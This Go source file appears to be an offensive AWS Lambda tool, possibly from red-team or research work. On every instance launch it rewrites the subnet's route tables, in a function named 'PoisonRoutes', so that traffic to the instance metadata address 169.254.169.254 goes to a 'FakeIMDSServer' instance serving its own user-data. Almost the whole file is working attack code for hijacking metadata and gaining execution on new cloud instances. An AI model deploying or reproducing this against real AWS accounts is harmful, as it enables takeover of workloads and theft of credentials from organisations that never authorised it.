package main

import (
	"context"
	"encoding/json"
	"fmt"
	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/config"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/pkg/errors"
)

const (
	FakeIMDSServerName = "FakeIMDSServer"
	OrigRouteTableId   = "OrigRouteTableId"
)

var (
	client           *ec2.Client
	FakeImdsInstance *types.Instance

)

func handleRequest(ctx context.Context, event events.CloudWatchEvent) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("[ERROR] %+v", r)
			return
		}
	}()

	if d, err := json.Marshal(event); err != nil {
		panic(errors.Wrap(err, "marshalling event"))
	} else {
		fmt.Println("Event: ", string(d))
	}

	runEvent := UnMarshallEvent(event)

	// Just take the first for now
	instance := runEvent.ResponseElements.InstancesSet.Items[0]

	if instance.SubnetId == *FakeImdsInstance.SubnetId {
		fmt.Printf("[INFO] skipping %s has because it's in the same subnet as the fake imds server", instance.InstanceId)
		return
	}
	PoisonRoutes(ctx, instance)
	fmt.Println("[INFO] Successfully updated routes")
}

func PoisonRoutes(ctx context.Context, instance ResponseInstanceItems) {
	// Check subnet for route table association, and fall back to using the vpc's
	currentTable := GetTableByInstance(ctx, instance)
	if CheckIfInUse(currentTable) {
		panic(errors.New("subnet route table is already serving another process"))
	}

	newTable := CreateNewTable(ctx, &instance.VpcId)
	CopyRoutes(ctx, currentTable, newTable.RouteTableId)
	CopyTags(ctx, currentTable, newTable)

	if association := GetAssociationId(currentTable, &instance.SubnetId); association == nil {
		newAssociation := AttachTable(ctx, newTable, &instance.SubnetId)
		AddMetaTags(ctx, newAssociation, currentTable, newTable, true)
	} else {
		newAssociation := SwapTables(ctx, association.RouteTableAssociationId, newTable)
		AddMetaTags(ctx, newAssociation, currentTable, newTable, false)
	}
	AddFakeRoute(ctx, newTable)
}

func CreateNewTable(ctx context.Context, vpcId *string) *types.RouteTable {
	newTable, err := client.CreateRouteTable(ctx, &ec2.CreateRouteTableInput{
		VpcId: vpcId,
	})
	if err != nil {
		panic(errors.Wrap(err, "creating new table"))
	}
	return newTable.RouteTable
}

func AttachTable(ctx context.Context, table *types.RouteTable, subnetId *string) *string {
	out, err := client.AssociateRouteTable(ctx, &ec2.AssociateRouteTableInput{
		RouteTableId: table.RouteTableId,
		SubnetId:     subnetId,
	}); if err != nil {
		panic(errors.Wrapf(err, "attaching %s to %s", table.RouteTableId, subnetId))
	}
	return out.AssociationId
}


func SwapTables(ctx context.Context, associationId *string, table *types.RouteTable) *string {
	out, err := client.ReplaceRouteTableAssociation(ctx, &ec2.ReplaceRouteTableAssociationInput{
		RouteTableId: table.RouteTableId,
		AssociationId: associationId,
	}); if err != nil {
		panic(err)
	}
	return out.NewAssociationId
}


// AddMetaTags adds the original routeTableId and associationId as a tag to the new table so we can
// easily revert later via the AWS cli in the user-data served from the fake IMDS server.
//
// The delete parameter indicates that the cleanup script (user-data from imds) should simply remove
// the association, which will cause the subnet to fall back implicitly to the VPC's main table.
func AddMetaTags(ctx context.Context, associationId *string, origTable, newTable *types.RouteTable, delete bool) {
	tags := types.Tag{
		Key: aws.String(OrigRouteTableId),
	}

	// These tags are for the cli script that references this.
	if delete {
		// Indicates the association should be disassociated
		tags.Value = aws.String(fmt.Sprintf("disassociate:%s:%s", *associationId, *newTable.RouteTableId))
	} else {
		// Indicates the route table should be swapped using the given association
		tags.Value = aws.String(fmt.Sprintf("%s:%s:%s", *origTable.RouteTableId, *associationId, *newTable.RouteTableId))
	}

	if _, err := client.CreateTags(ctx, &ec2.CreateTagsInput{
		Resources: []*string{newTable.RouteTableId},
		Tags:      []*types.Tag{&tags},
	}); err != nil {
		panic(errors.Wrap(err, "adding tags"))
	}
}
	
func AddFakeRoute(ctx context.Context, table *types.RouteTable) *types.RouteTable {
	if _, err := client.CreateRoute(ctx, &ec2.CreateRouteInput{
		RouteTableId:         table.RouteTableId,
		DestinationCidrBlock: aws.String("169.254.169.254/32"),
		InstanceId:           FakeImdsInstance.InstanceId,
	}); err != nil {
		panic(err)
	} else {
		return table
	}
}

func CopyRoutes(ctx context.Context, table *types.RouteTable, newTable *string) {
	for _, route := range table.Routes {

		if route.GatewayId != nil && *route.GatewayId == "local" {
			continue
		}

		if _, err := client.CreateRoute(ctx, &ec2.CreateRouteInput{
			RouteTableId:                newTable,
			CarrierGatewayId:            route.CarrierGatewayId,
			DestinationCidrBlock:        route.DestinationCidrBlock,
			DestinationIpv6CidrBlock:    route.DestinationIpv6CidrBlock,
			DestinationPrefixListId:     route.DestinationPrefixListId,
			EgressOnlyInternetGatewayId: route.EgressOnlyInternetGatewayId,
			GatewayId:                   route.GatewayId,
			InstanceId:                  route.InstanceId,
			LocalGatewayId:              route.LocalGatewayId,
			NatGatewayId:                route.NatGatewayId,
			NetworkInterfaceId:          route.NetworkInterfaceId,
			TransitGatewayId:            route.TransitGatewayId,
			VpcPeeringConnectionId:      route.VpcPeeringConnectionId,
		}); err != nil {
			panic(err)
		}
	}
}

func CopyTags(ctx context.Context, src, dst *types.RouteTable) {
	if tags, err := client.DescribeTags(ctx, &ec2.DescribeTagsInput{
		Filters:    []*types.Filter{
			{
				Name: aws.String("resource-type"),
				Values: aws.StringSlice([]string{"route-table"}),
			},
			{
				Name: aws.String("resource-id"),
				Values: aws.StringSlice([]string{*src.RouteTableId}),
			},
		},
	}); err != nil {
		panic(err)
	} else {
		var newTags []*types.Tag

		for _, tag := range tags.Tags {
			newTags = append(newTags, &types.Tag{
				Key:   tag.Key,
				Value: tag.Value,
			})
		}

		if len(newTags) == 0 {
			return
		}

		if _, err := client.CreateTags(ctx, &ec2.CreateTagsInput{
			Resources: []*string{dst.RouteTableId},
			Tags:      newTags,
		}); err != nil {
			panic(errors.Wrap(err, "copying tags"))
		}
	}
}

func main() {
	if conf, err := config.LoadDefaultConfig(); err != nil {
		panic(err)
	} else {
		client = ec2.NewFromConfig(conf)
	}
	FakeImdsInstance = FirstInstanceByName(context.Background(), aws.String(FakeIMDSServerName))
	lambda.Start(handleRequest)
}
